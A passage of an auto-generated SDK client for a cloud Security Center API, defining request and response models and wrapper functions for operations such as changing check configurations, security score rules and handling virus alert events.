  startTime?: int32(name='StartTime', description='The start time of the check. The value specifies a point in time in a day.', example='0'),
  systemConfig?: boolean(name='SystemConfig', description='Specifies whether to use the configuration automatically generated by the system. Valid values:

*   **true**
*   **false**', example='true'),
  vendors?: [ string ](name='Vendors', description='The cloud service providers.'),
}

model ChangeCheckConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6EBB8614-746D-555D-AB69-C801AEC7DCE0'),
}

model ChangeCheckConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ChangeCheckConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the configuration items of the configuration assessment feature.
 *
 * @param tmpReq ChangeCheckConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ChangeCheckConfigResponse
 */
async function changeCheckConfigWithOptions(tmpReq: ChangeCheckConfigRequest, runtime: Util.RuntimeOptions): ChangeCheckConfigResponse {
  Util.validateModel(tmpReq);
  var request = new ChangeCheckConfigShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.configRequirementIds)) {
    request.configRequirementIdsShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.configRequirementIds, 'ConfigRequirementIds', 'json');
  }
  if (!Util.isUnset(tmpReq.configStandardIds)) {
    request.configStandardIdsShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.configStandardIds, 'ConfigStandardIds', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.addedCheck)) {
    query['AddedCheck'] = request.addedCheck;
  }
  if (!Util.isUnset(request.configRequirementIdsShrink)) {
    query['ConfigRequirementIds'] = request.configRequirementIdsShrink;
  }
  if (!Util.isUnset(request.configStandardIdsShrink)) {
    query['ConfigStandardIds'] = request.configStandardIdsShrink;
  }
  if (!Util.isUnset(request.configure)) {
    query['Configure'] = request.configure;
  }
  if (!Util.isUnset(request.cycleDays)) {
    query['CycleDays'] = request.cycleDays;
  }
  if (!Util.isUnset(request.enableAddCheck)) {
    query['EnableAddCheck'] = request.enableAddCheck;
  }
  if (!Util.isUnset(request.enableAutoCheck)) {
    query['EnableAutoCheck'] = request.enableAutoCheck;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.removedCheck)) {
    query['RemovedCheck'] = request.removedCheck;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.systemConfig)) {
    query['SystemConfig'] = request.systemConfig;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeCheckConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configuration items of the configuration assessment feature.
 *
 * @param request ChangeCheckConfigRequest
 * @return ChangeCheckConfigResponse
 */
async function changeCheckConfig(request: ChangeCheckConfigRequest): ChangeCheckConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeCheckConfigWithOptions(request, runtime);
}

model ChangeCheckCustomConfigRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [ListCheckResult](~~ListCheckResult~~) operation to query the IDs of check items.', example='76'),
  customConfigs?: [ 
    {
      name?: string(name='Name', description='The name of the custom configuration item. The name of a custom configuration item is unique in a check item.', example='SessionTimeMax'),
      operation?: string(name='Operation', description='The operation that you want to perform on the custom configuration item. This parameter is required only if you want to delete the custom configuration item. To delete the custom configuration item, set the value to DELETE.', example='DELETE'),
      value?: string(name='Value', description='The value of the custom configuration item. The value is a string.', example='13'),
    }
  ](name='CustomConfigs', description='The custom configuration items of the check item.'),
  regionId?: string(name='RegionId', description='The region where the Security Center instance is deployed. Valid values:

*   **cn-hangzhou**: International
*   **ap-southeast-1**: Singapore', example='cn-hangzhou'),
  repairConfigs?: [ 
    {
      flowId?: string(name='FlowId', description='The ID of the fixing process.', example='ascgrmscyjgs*********'),
      name?: string(name='Name', description='The name of the parameter required for fixing a risk item, which is unique in a check item.', example='Port'),
      operation?: string(name='Operation', description='The operation that you want to perform on the custom configuration item. This parameter is required only if you want to delete the custom configuration item. To delete the custom configuration item, set the value to DELETE.', example='DELETE'),
      value?: string(name='Value', description='The value of the parameter required for fixing a risk item. The value is a string.', example='80'),
    }
  ](name='RepairConfigs', description='The parameters required for fixing risk items.'),
}

model ChangeCheckCustomConfigResponseBody = {
  illegalCustomConfigs?: [ 
    {
      name?: string(name='Name', description='The name of the custom configuration item, which is unique in a check item.', example='SessionTimeMax'),
    }
  ](name='IllegalCustomConfigs', description='An array that consists of the invalid custom configuration items of the check item.'),
  illegalRepairConfigs?: [ 
    {
      name?: string(name='Name', description='The name of the invalid parameter required for fixing a risk item.', example='SessionTimeMax'),
    }
  ](name='IllegalRepairConfigs', description='An array that consists of the invalid parameters required for fixing risk items.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DA8133CC-CCA0-5CF2-BF64-FE7D52C44***'),
}

model ChangeCheckCustomConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ChangeCheckCustomConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the custom configuration items of a check item.
 *
 * @param request ChangeCheckCustomConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ChangeCheckCustomConfigResponse
 */
async function changeCheckCustomConfigWithOptions(request: ChangeCheckCustomConfigRequest, runtime: Util.RuntimeOptions): ChangeCheckCustomConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.customConfigs)) {
    query['CustomConfigs'] = request.customConfigs;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.repairConfigs)) {
    query['RepairConfigs'] = request.repairConfigs;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeCheckCustomConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the custom configuration items of a check item.
 *
 * @param request ChangeCheckCustomConfigRequest
 * @return ChangeCheckCustomConfigResponse
 */
async function changeCheckCustomConfig(request: ChangeCheckCustomConfigRequest): ChangeCheckCustomConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeCheckCustomConfigWithOptions(request, runtime);
}

model ChangeSecurityScoreRuleRequest {
  resetSecurityScoreRule?: boolean(name='ResetSecurityScoreRule', description='Specifies whether to reset to the system default rule. Valid values:

*   true: yes
*   false: no', example='false'),
  securityScoreRuleList?: [ 
    {
      ruleType?: string(name='RuleType', description='The deduction module that is supported by the security score feature. Valid values:

*   SS_REINFORCE: issue in key feature configuration
*   SS_ALARM: unhandled alert
*   SS_VUL: unfixed vulnerability
*   SS_HC: baseline risk
*   SS_CLOUD_HC: Cloud platform configuration check item problem.
*   SS_AK: risk of AccessKey pair leaks', example='SS_ALARM'),
      score?: int32(name='Score', description='The deduction threshold of the deduction module.

>  Valid values: 0 to 100. The sum of the deduction thresholds for all deduction modules must be equal to 100.', example='5'),
      securityScoreItemList?: [ 
        {
          score?: int32(name='Score', description='The penalty point of the deduction item.', example='5'),
          scoreThreshold?: int32(name='ScoreThreshold', description='The threshold for the deduction item.

>  Valid values: 0 to the deduction threshold of the deduction module.', example='10'),
          subRuleType?: string(name='SubRuleType', description='The deduction item of the deduction module. The following list describes the deduction modules and their deduction items:

*   SS_REINFORCE: issue in key feature configuration

    *   XPRESS_INSTALL: Security Center is not authorized.
    *   REINFORCE_SUSPICIOUS: The anti-virus feature is disabled.
    *   RANSOMWARE: The anti-ransomware policy is disabled.
    *   WEB_LOCK: The web tamper proofing feature is disabled.
    *   VIRUS_SCHEDULE_SCAN: The periodic virus scan policy is disabled.
    *   IMAGE_REPO_SCAN: The container image scan range is not configured.
    *   IMAGE_SCAN_TASK: The feature of one-click scan of container images for security risks is not performed.

*   SS_ALARM: unhandled alert

    *   ALARM_SERIOUS: An unhandled high-risk alert event is detected.
    *   ALARM_SUSPICIOUS: An unhandled medium-risk alarm event is detected.
    *   ALARM_REMIND: An unhandled low-risk alarm event is detected.

*   SS_VUL: unfixed vulnerability

    *   CMS_UNFIX: An unfixed Web-CMS vulnerability is detected.
    *   WIN_UNFIX: An unfixed Windows host vulnerability is detected.
    *   CVE_UNFIX: An unfixed Linux host vulnerability is detected.
    *   ERM_UNFIX: An unfixed emergency vulnerability is detected.
    *   ERM_UNCHECK: An undetected emergency vulnerability exists.

*   SS_HC: baseline risks

    *   WEAK_EXPLOIT: Weak passwords are exposed to the Internet.
    *   WEAK_PASSWORD: Weak passwords exist.
    *   HC_EXPLOIT: The data source may be hacked.
    *   HC_OTHER_WARNING: Security configuration risks exist.

*   SS_CLOUD_HC: Cloud platform configuration check item problem.

    *   CSPM_CIEM_NOT_PASS: A CIEM check item failed the check.
    *   CSPM_RISK_NOT_PASS: A security risk check item failed the check.
    *   CSPM_COMPLIANCE_NOT_PASS: A compliance check item failed the check.

*   SS_AK: risk of AccessKey pair leaks', example='ALARM_SERIOUS'),
        }
      ](name='SecurityScoreItemList', description='The deduction items of the deduction module.'),
    }
  ](name='SecurityScoreRuleList', description='The list of deduction modules that are supported by the security score feature.'),
}

model ChangeSecurityScoreRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='23AD0BD2-8771-5647-819E-6BA51E21****'),
}

model ChangeSecurityScoreRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ChangeSecurityScoreRuleResponseBody(name='body'),
}

/**
 * @summary Modifies the details of the deduction modules of the security score feature, including custom settings.
 *
 * @param request ChangeSecurityScoreRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ChangeSecurityScoreRuleResponse
 */
async function changeSecurityScoreRuleWithOptions(request: ChangeSecurityScoreRuleRequest, runtime: Util.RuntimeOptions): ChangeSecurityScoreRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resetSecurityScoreRule)) {
    query['ResetSecurityScoreRule'] = request.resetSecurityScoreRule;
  }
  if (!Util.isUnset(request.securityScoreRuleList)) {
    query['SecurityScoreRuleList'] = request.securityScoreRuleList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeSecurityScoreRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the details of the deduction modules of the security score feature, including custom settings.
 *
 * @param request ChangeSecurityScoreRuleRequest
 * @return ChangeSecurityScoreRuleResponse
 */
async function changeSecurityScoreRule(request: ChangeSecurityScoreRuleRequest): ChangeSecurityScoreRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeSecurityScoreRuleWithOptions(request, runtime);
}

model ChangeUserLangRequest {
  userLang?: string(name='UserLang', description='The new language. Valid values:

*   zh: Chinese
*   en: English', example='zh'),
}

model ChangeUserLangResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='2F5AA940-9EBF-5948-ACE7-3EF0FE54****'),
}

model ChangeUserLangResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ChangeUserLangResponseBody(name='body'),
}

/**
 * @summary Modifies the language settings of log analysis. The modification on the language settings takes effect within 12 hours and affects only the language of the descriptions for security events in security logs.
 *
 * @param request ChangeUserLangRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ChangeUserLangResponse
 */
async function changeUserLangWithOptions(request: ChangeUserLangRequest, runtime: Util.RuntimeOptions): ChangeUserLangResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.userLang)) {
    query['UserLang'] = request.userLang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeUserLang',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the language settings of log analysis. The modification on the language settings takes effect within 12 hours and affects only the language of the descriptions for security events in security logs.
 *
 * @param request ChangeUserLangRequest
 * @return ChangeUserLangResponse
 */
async function changeUserLang(request: ChangeUserLangRequest): ChangeUserLangResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeUserLangWithOptions(request, runtime);
}

model CheckQuaraFileIdRequest {
  quaraFileIds?: [ string ](name='QuaraFileIds', description='The IDs of quarantined files that you want to check.

>  You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.

This parameter is required.'),
  uuid?: string(name='Uuid', description='The UUID of the server on which you want to check quarantined files.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model CheckQuaraFileIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the ID of the quarantined file is valid. Valid values:

*   **true**: The ID of the quarantined file is valid.
*   **false**: The ID of the quarantined file is invalid.', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CheckQuaraFileIdResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CheckQuaraFileIdResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI CheckQuaraFileId is deprecated
 *
 * @summary Checks whether the IDs of quarantined files are valid.
 *
 * @param request CheckQuaraFileIdRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CheckQuaraFileIdResponse
 */
// Deprecated
async function checkQuaraFileIdWithOptions(request: CheckQuaraFileIdRequest, runtime: Util.RuntimeOptions): CheckQuaraFileIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.quaraFileIds)) {
    query['QuaraFileIds'] = request.quaraFileIds;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckQuaraFileId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI CheckQuaraFileId is deprecated
 *
 * @summary Checks whether the IDs of quarantined files are valid.
 *
 * @param request CheckQuaraFileIdRequest
 * @return CheckQuaraFileIdResponse
 */
// Deprecated
async function checkQuaraFileId(request: CheckQuaraFileIdRequest): CheckQuaraFileIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkQuaraFileIdWithOptions(request, runtime);
}

model CheckSecurityEventIdRequest {
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of alert events. You can specify up to 100 IDs. If you do not specify this parameter, the value of the response parameter **Data** is **false**. The value false indicates that no alert events are generated on the server.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the IDs of alert events.', example='["1234567","98765432"]'),
  uuid?: string(name='Uuid', description='The UUID of the server.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='96ad2473-bc60-45ba-ad1c-932e2866****'),
}

model CheckSecurityEventIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the alert events are generated on the server. Valid values:

*   **true**
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E67FE'),
}

model CheckSecurityEventIdResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CheckSecurityEventIdResponseBody(name='body'),
}

/**
 * @summary Checks whether one or more alert events are generated on a specified server based on the IDs of the alert events.
 *
 * @param request CheckSecurityEventIdRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CheckSecurityEventIdResponse
 */
async function checkSecurityEventIdWithOptions(request: CheckSecurityEventIdRequest, runtime: Util.RuntimeOptions): CheckSecurityEventIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckSecurityEventId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks whether one or more alert events are generated on a specified server based on the IDs of the alert events.
 *
 * @param request CheckSecurityEventIdRequest
 * @return CheckSecurityEventIdResponse
 */
async function checkSecurityEventId(request: CheckSecurityEventIdRequest): CheckSecurityEventIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkSecurityEventIdWithOptions(request, runtime);
}

model CheckStsTokenAuthResponseBody = {
  data?: long(name='Data', description='The ID of the Alibaba Cloud account.', example='185685871307****'),
  requestId?: string(name='RequestId', description='The request ID.', example='898F7AA7-CECD-5EC7-AF4D-664C601B****'),
}

model CheckStsTokenAuthResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CheckStsTokenAuthResponseBody(name='body'),
}

/**
 * @summary Checks a Security Token Service (STS) token and returns the ID of the Alibaba Cloud account.
 *
 * @param request CheckStsTokenAuthRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CheckStsTokenAuthResponse
 */
async function checkStsTokenAuthWithOptions(runtime: Util.RuntimeOptions): CheckStsTokenAuthResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'CheckStsTokenAuth',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks a Security Token Service (STS) token and returns the ID of the Alibaba Cloud account.
 *
 * @return CheckStsTokenAuthResponse
 */
async function checkStsTokenAuth(): CheckStsTokenAuthResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkStsTokenAuthWithOptions(runtime);
}

model CheckTrialFixCountRequest {
  info?: string(name='Info', description='The information about the vulnerability. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the name of the vulnerability.

*   **uuid**: the UUID of the server on which the vulnerability is detected.

*   **tag**: the tag that is added to the vulnerability. Valid values:

    *   **oval**: Linux software vulnerability.
    *   **system**: Windows system vulnerability.
    *   **cms**: Web-CMS vulnerability.

>  You must specify a value for Info or values for VulNames and Uuids to identify a vulnerability.', example='[{\\\\"name\\\\":\\\\"oval:com.redhat.rhsa:def:20192143\\\\",\\\\"uuid\\\\":\\\\"80ee3226-1f96-4da0-a3ed-55c104e2****\\\\",\\\\"tag\\\\":\\\\"oval\\\\"}]'),
  type?: string(name='Type', description='The type of the vulnerability that you want to fix. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.

This parameter is required.', example='cve'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of the servers.'),
  vulNames?: [ string ](name='VulNames', description='The names of the vulnerabilities.'),
}

model CheckTrialFixCountResponseBody = {
  canFix?: boolean(name='CanFix', description='Indicates whether the vulnerability can be fixed. Valid values:

*   **true**
*   **false**', example='true'),
  expendCount?: int32(name='ExpendCount', description='The quota usage required for the current fix operation.', example='10'),
  remainCount?: int32(name='RemainCount', description='The quota that remains after the current fix operation is complete.', example='0'),
  repairedCount?: int32(name='RepairedCount', description='The number of the vulnerabilities that are fixed.', example='10'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  isTrial?: boolean(name='isTrial', description='Indicates whether Security Center is in free trial. Valid values:

*   **true**
*   **false**', example='true'),
}

model CheckTrialFixCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CheckTrialFixCountResponseBody(name='body'),
}

/**
 * @summary Checks whether the remaining quota of the vulnerability fixing feature is sufficient for a free trial user of Security Center and queries the quota usage required for the current fix operation.
 *
 * @description You can call this operation to check whether the remaining quota of the vulnerability fixing feature is sufficient in free trial scenarios. This operation does not trigger vulnerability fixing.
 *
 * @param request CheckTrialFixCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CheckTrialFixCountResponse
 */
async function checkTrialFixCountWithOptions(request: CheckTrialFixCountRequest, runtime: Util.RuntimeOptions): CheckTrialFixCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckTrialFixCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks whether the remaining quota of the vulnerability fixing feature is sufficient for a free trial user of Security Center and queries the quota usage required for the current fix operation.
 *
 * @description You can call this operation to check whether the remaining quota of the vulnerability fixing feature is sufficient in free trial scenarios. This operation does not trigger vulnerability fixing.
 *
 * @param request CheckTrialFixCountRequest
 * @return CheckTrialFixCountResponse
 */
async function checkTrialFixCount(request: CheckTrialFixCountRequest): CheckTrialFixCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkTrialFixCountWithOptions(request, runtime);
}

model CheckUserHasEcsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model CheckUserHasEcsResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  data?: boolean(name='Data', description='Indicates whether ECS instances exist. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  success?: boolean(name='Success', description='The status of the request. Valid values:

*   **true**: The request is successful.
*   **false**: The request fails.', example='true'),
}

model CheckUserHasEcsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CheckUserHasEcsResponseBody(name='body'),
}

/**
 * @summary Checks whether Elastic Compute Service (ECS) instances exist.
 *
 * @param request CheckUserHasEcsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CheckUserHasEcsResponse
 */
async function checkUserHasEcsWithOptions(request: CheckUserHasEcsRequest, runtime: Util.RuntimeOptions): CheckUserHasEcsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckUserHasEcs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks whether Elastic Compute Service (ECS) instances exist.
 *
 * @param request CheckUserHasEcsRequest
 * @return CheckUserHasEcsResponse
 */
async function checkUserHasEcs(request: CheckUserHasEcsRequest): CheckUserHasEcsResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkUserHasEcsWithOptions(request, runtime);
}

model ConfirmVirusEventsRequest {
  operationAll?: int32(name='OperationAll', description='Specifies whether to handle all alert events. Valid values:

*   **1**: yes
*   **0**: no

This parameter is required.', example='0'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **default**: performs in-depth detection and removal
*   **ignore**: ignores the alert event
*   **advance_mark_mis_info**: adds the alert events to the whitelist
*   **manual_handled**: marks the alert events as manually handled

This parameter is required.', example='default'),
  operationRange?: string(name='OperationRange', description='The server on which you want to perform the alert events.', example='[{\\\\"type\\\\":\\\\"machine\\\\",\\\\"list\\\\":[\\\\"3aedba3d-bd4d-4dfb-bb0d-xxxxxxxxxxxx\\\\"]}]'),
}

model ConfirmVirusEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='5DFD6277-CC36-57F7-ACE6-F5952XXXXXXXX'),
  result?: boolean(name='Result', description='Indicates whether the request was successful. Valid values:

*   true: The request was successful.
*   false: The request failed.', example='true'),
}

model ConfirmVirusEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ConfirmVirusEventsResponseBody(name='body'),
}

/**
 * @summary Confirms the alert events that you want to handle.
 *
 * @param request ConfirmVirusEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ConfirmVirusEventsResponse
 */
async function confirmVirusEventsWithOptions(request: ConfirmVirusEventsRequest, runtime: Util.RuntimeOptions): ConfirmVirusEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operationAll)) {
    query['OperationAll'] = request.operationAll;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationRange)) {
    query['OperationRange'] = request.operationRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ConfirmVirusEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Confirms the alert events that you want to handle.
 *
 * @param request ConfirmVirusEventsRequest
 * @return ConfirmVirusEventsResponse
 */
async function confirmVirusEvents(request: ConfirmVirusEventsRequest): ConfirmVirusEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return confirmVirusEventsWithOptions(request, runtime);
}

model CopyCustomizeReportConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reportId?: long(name='ReportId', description='The ID of the report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.

This parameter is required.', example='492742'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.46.XXX.XXX'),
}

model CopyCustomizeReportConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1EE7B150-D67E-53FD-A52D-3E8E669A****'),
}

model CopyCustomizeReportConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CopyCustomizeReportConfigResponseBody(name='body'),
}

/**
